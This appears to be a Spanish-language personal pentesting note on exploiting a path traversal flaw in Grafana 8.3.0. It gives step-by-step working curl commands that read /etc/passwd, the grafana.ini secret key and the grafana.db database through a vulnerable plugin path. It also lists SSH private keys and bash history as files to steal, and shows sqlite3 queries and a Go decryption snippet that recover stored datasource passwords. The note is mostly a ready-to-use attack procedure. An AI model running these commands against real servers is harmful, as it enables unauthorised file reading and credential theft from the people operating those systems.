# Grafana 

Tags: #Grafana #Linux 

**Grafana** es una herramienta de **visualización y monitoreo** de datos (open source).
Se usa mucho en empresas para mostrar métricas, logs y dashboards en tiempo real (CPU, memoria, tráfico de red, aplicaciones, etc.).

# Versión 8.3.0 - Path Traversal 

* [Path Traversal](https://www.exploit-db.com/exploits/50581)
### Forma Manual 
```bash 
# Archivos a leer 
/home/user/.ssh/id_rsa  # Leer la clave privada del usuario 
/root/.ssh/id_rsa

# Base de datos SQLite de Grafana (si existe)
/var/lib/grafana/grafana.db 

# Credenciales almacenadas en Grafana
/etc/grafana/grafana.ini   <-- IMPORTANTE (Secret Key) 'SW2YcwTIb9zpOOhoPsMm'
/usr/share/grafana/conf/defaults.ini

# Historial 
/home/sysadmin/.bash_history

# Otros 
/var/log/grafana/grafana.log
```

```bash 
Paso 1:
# Mirar el archivo /etc/passwd para encontrar usuarios 
❯ curl --path-as-is "http://IP:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
	# alertlist = Es un plugin vulnerable 
	# Hay unaa lista de plugins vulnerables en el link 
```

```bash 
Paso 2:
# Obtener la secret key 
❯ curl --path-as-is "http://IP:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini"

Paso 3:
# Descargar la DB
❯ curl --path-as-is "http://IP:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" > grafana.db 

❯ file grafana.db   # Identificar el tipo de contenido (SQLite3)
```

### Descifrar la contraseña 

```bash 
Paso 4:
# Mirar que tipo de DB es
❯ sqlite3 grafana.db ".schema user"   # Muestra la estrcutura de la DB
	
	`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL
	 `email` TEXT NOT NULL
	 `name` TEXT NULL
	 `password` TEXT NULL
	 `salt` TEXT NULL     <-- IMPORTANTE PARA EL SCRIPT
	 `is_admin` INTEGER NOT NULL

❯ sqlite3 grafana.db ".tables"   # Mirar las tablas en la DB 
❯ sqlite3 grafana.db "SELECT * FROM user LIMIT 1;"  # Muestra los datos 

❯ sqlite3 grafana.db "SELECT * FROM data_source LIMIT 1;"  # Muestra los datos como la password en cifrado AES-256-CFB:
	anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==

NOTA:
	- En 'data_source' se encuentra el usuario y la password pero al buscarla en google muestra que es un AES-256-CFB
```

* [CVE-2021-43798 -- AESDecrypt](https://github.com/jas502n/Grafana-CVE-2021-43798)

```bash 
Paso 5:
# Utilizar el siguiente script para descifrar la password modificando el 'secretKey' y la 'Password en AES-256-CFB' 

func main() {
        // decode base64str
        var grafanaIni_secretKey = "SW2YcwTIb9zpOOhoPsMm"
        var dataSourcePassword = "anBneWFNQ2z+IDGhz3a7...ZwVzreNJSw+hsV4w=="
```

```bash 
Paso 6:
# Inicializar el módulo Go  (IMPORTANTE)
❯ go mod init decrypt
❯ go mod tidy

# Ejecutar el descifrado 
❯ go run AESDecrypt.go   
```

